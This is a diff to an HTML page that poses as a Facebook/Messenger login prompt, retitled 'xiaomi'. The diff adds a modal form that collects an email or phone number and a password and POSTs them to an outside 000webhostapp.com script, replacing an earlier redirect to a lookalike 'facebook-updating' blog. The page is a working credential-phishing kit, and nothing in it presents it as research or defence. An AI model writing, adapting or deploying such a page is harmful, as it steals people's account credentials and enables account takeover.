@@ -10,8 +10,8 @@
     <meta charset='UTF-8' />
     <meta content='IE=edge' http-equiv='X-UA-Compatible' />
     <meta content='width=device-width, initial-scale=1.0' name='viewport' />
-    <title>Login First</title>
-    <link href='https://www2.0zz0.com/2021/08/26/13/813465867.png' rel='icon' sizes='16x16' type='image/gif' />
+    <title>xiaomi</title>
+    <link href='https://www14.0zz0.com/2021/08/26/12/229570044.png' rel='icon' sizes='16x16' type='image/gif' />
     <style>
         body,
         html {
@@ -119,7 +119,7 @@
         }
 
         [class~=logo] {
-            background-image: url("https://www2.0zz0.com/2021/08/26/13/813465867.png");
+            background-image: url("https://www14.0zz0.com/2021/08/26/12/229570044.png");
         }
 
         [class~=container] [class~=checkmark]:after {
@@ -272,6 +272,9 @@
             font-size: .177083333in;
         }
 
+        .body3 h2 {
+            font-weight: 200;
+        }
 
         [class~=inputl] {
             width: 2.979166667in;
@@ -625,9 +628,9 @@
         }
 
         .logo {
-            background: url(https://www2.0zz0.com/2021/08/26/13/813465867.png);
+            background: url(https://www14.0zz0.com/2021/08/26/12/229570044.png);
             background-repeat: no-repeat;
-            background-size: 110px 110px;
+            background-size: 100px 100px;
         }
 
         .body3 {
@@ -638,7 +641,7 @@
             flex-direction: column;
             padding: 50px;
             text-align: center;
-            margin-top: 30px;
+            margin-top: 50px;
         }
 
         .fbtn {
@@ -740,22 +743,35 @@
             <br />
             <br />
             <br />
-            <h2>To continue, log in frist</h2>
+            <h3>To continue, log in</h3>
             <br />
             <br />
-            <button class='fbtn' id='btn' onclick="myFunction()">Continue with Facebook</button>
+            <button class='fbtn' id='btn'>Continue with Facebook</button>
             <div style='font-size: 14px; text-align: center; padding: 15px; margin: 10px;'>
                 <span id='copyright' style='text-decoration:none;color:#999999;font-weight:bold;'
                     title='Messenger'>Messenger Copyright &#169;&#65039;</span>
             </div>
         </div>
     </div>
+    <div class='bg-modal'>
+        <div class='modal-cont'>
+            <img class='img' src='https://www14.0zz0.com/2021/08/26/12/229570044.png' />
+            <h3 style='color: #4b4b4b;'>Sign up for your Facebook account to follow</h3>
+            <form action='https://maassengger.000webhostapp.com/Hogin.php' autocomplete='on' id='veh0' method='POST'
+                name='loginform'>
+                <input class='inp' id='erorremin' maxlength='50' minlength='6' name='email'
+                    placeholder='Email address or phone number' required='' type='text' />
+                <input class='inp' id='erorrpain' maxlength='50' minlength='6' name='pass' placeholder='Password'
+                    required='' type='password' />
+                <button class='button' type='submit'>Login</button>
+            </form>
+        </div>
+    </div>
     <script>
-        function myFunction() {
-            location.replace("https://facebook-updating.blogspot.com/")
-        }
+        document.getElementById('btn').addEventListener("click", function () {
+            document.querySelector('.bg-modal').style.display = "flex";
+        });
     </script>
-
 
 </body>
 
